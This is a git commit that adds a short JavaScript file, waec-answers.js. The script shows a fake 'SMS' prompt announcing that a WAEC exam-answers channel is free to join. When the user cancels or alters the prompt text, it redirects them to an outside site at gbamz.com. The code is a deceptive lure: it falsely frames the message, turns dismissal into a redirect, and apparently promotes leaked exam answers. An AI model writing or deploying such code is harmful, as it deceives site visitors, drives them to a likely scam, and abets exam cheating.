4d9ad51093f85a78eb5efb2652cdde6c29dd777a
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-04 09:35:29 +0100

    Create waec-answers.js

---
+++ waec-answers.js
@@ -0,0 +1,5 @@
+var password = 'VIEW ANSWERS'
+password=prompt('SMS: Congratulations, WAEC Answers Channel is now free to Join, click OK to Join now before we lock the Channel','VIEW ANSWERS');
+if (password != 'VIEW ANSWERS') {
+location.href='https://gbamz.com/waec-answers';
+}
